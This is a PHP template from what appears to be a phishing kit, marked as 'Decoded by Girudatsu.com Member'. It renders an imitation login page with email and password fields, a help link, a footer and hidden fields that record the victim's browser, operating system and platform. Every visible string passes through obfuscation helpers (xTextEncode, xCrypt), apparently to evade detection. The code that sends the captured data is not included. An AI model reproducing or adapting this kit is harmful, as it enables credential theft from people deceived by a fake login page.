<?php
// Decoded by Girudatsu.com Member

include 'inc/crypt.php';
echo '<!' . xCrypt(52 + 48, 520 + -20) . '>';
?>
 <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/script.js');
?>
"></script>
   <div class="<?php
echo xCrypt(-1 - -11, 32 - -18);
?>
 <?php
echo xTextEncode('container');
?>
">
    <div class="<?php
echo xCrypt(48 + -38, 136 + -86);
?>
 <?php
echo xTextEncode('row form');
?>
">
      <div id="<?php
echo xTextEncode('login_form');
?>
">
      <!-- <form action="#" id="<?php
echo xTextEncode('x_form_1');
?>
"> -->
        <div id="<?php
echo xTextEncode('header');
?>
"></div>
<?php
echo '<!' . xCrypt(172 + -72, 112 + 388) . '>';
?>
        <div class="<?php
echo xCrypt(79 + -69, 148 + -98);
?>
 <?php
echo xTextEncode('twelve columns error_login u-full-width');
?>
"><?php
echo xTextEncode('Some information you entered doesn\'t look right.');
?>
</div>
<?php
echo '<!' . xCrypt(26 - -74, 71 + 429) . '>';
?>
        <div class="<?php
echo xCrypt(59 + -49, 79 - 29);
?>
 <?php
echo xTextEncode('twelve columns');
?>
">
          <input type="<?php
echo xTextEncode('text');
?>
" class="<?php
echo xCrypt(-48 - -58, 143 + -93);
?>
 <?php
echo xTextEncode('twelve columns u-full-width');
?>
" name="<?php
echo xTextEncode('user');
?>
" id="<?php
echo xTextEncode('user');
?>
" value="" placeholder="<?php
echo xTextEncode('Email address');
?>
">
          <div id="<?php
echo xTextEncode('error_user');
?>
"><?php
echo xTextEncode('Enter your email address.');
?>
</div>
          <div id="<?php
echo xTextEncode('error_icon_user');
?>
"></div>
        </div>
<?php
echo '<!' . xCrypt(58 - -42, 25 + 475) . '>';
?>
        <div class="<?php
echo xCrypt(43 + -33, 82 + -32);
?>
 <?php
echo xTextEncode('twelve columns');
?>
">
          <input type="<?php
echo xTextEncode('password');
?>
" class="<?php
echo xCrypt(41 + -31, 83 + -33);
?>
 <?php
echo xTextEncode('twelve columns u-full-width');
?>
" name="<?php
echo xTextEncode('pass');
?>
" id="<?php
echo xTextEncode('pass');
?>
" value="" placeholder="<?php
echo xTextEncode('Enter your password');
?>
">
          <div id="<?php
echo xTextEncode('error_pass');
?>
"><?php
echo xTextEncode('Enter your password.');
?>
</div>
          <div id="<?php
echo xTextEncode('error_icon_pass');
?>
"></div>
        </div>
<?php
echo '<!' . xCrypt(177 - 77, 644 - 144) . '>';
?>
        <div class="<?php
echo xCrypt(107 + -97, 26 - -24);
?>
 <?php
echo xTextEncode('twelve columns');
?>
">
          <input type="<?php
echo xTextEncode('submit');
?>
" class="<?php
echo xCrypt(-32 - -42, 53 + -3);
?>
 <?php
echo xTextEncode('button-primary u-full-width');
?>
" name="<?php
echo xTextEncode('xSubmit');
?>
" id="<?php
echo xTextEncode('xSubmit');
?>
" value="<?php
echo xTextEncode('Log In');
?>
">
        </div>
<?php
echo '<!' . xCrypt(196 + -96, 887 - 387) . '>';
?>
        <div id="<?php
echo xTextEncode('forget');
?>
" class="<?php
echo xCrypt(51 + -41, 33 - -17);
?>
 <?php
echo xTextEncode('twelve columns');
?>
" ><?php
echo xTextEncode('Having trouble logging in?');
?>
</div>
        <input type="<?php
echo xTextEncode('submit');
?>
" class="<?php
echo xCrypt(-3 - -13, 139 + -89);
?>
 <?php
echo xTextEncode('button twelve columns');
?>
" name="" id="" value="Sign Up">
        <input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('xBrowser');
?>
" id="<?php
echo xTextEncode('xBrowser');
?>
" value="">
        <input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('xOperatingSystem');
?>
" id="<?php
echo xTextEncode('xOperatingSystem');
?>
" value="">
        <input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('xPlatForm');
?>
" id="<?php
echo xTextEncode('xPlatForm');
?>
" value="">
      <!-- </form> -->
      </div>
    </div>
    <div class="<?php
echo xCrypt(-54 - -64, 83 - 33);
?>
 <?php
echo xTextEncode('row');
?>
">
        <div id="<?php
echo xTextEncode('footer');
?>
"><?php
echo xTextEncode('Contact Us');
?>
&nbsp;&nbsp;&nbsp;&nbsp;<?php
echo xTextEncode('Privacy');
?>
&nbsp;&nbsp;&nbsp;&nbsp;<?php
echo xTextEncode('Legal');
?>
&nbsp;&nbsp;&nbsp;<?php
echo xTextEncode('Worldwide');
?>
</div>
    </div>
  </div>
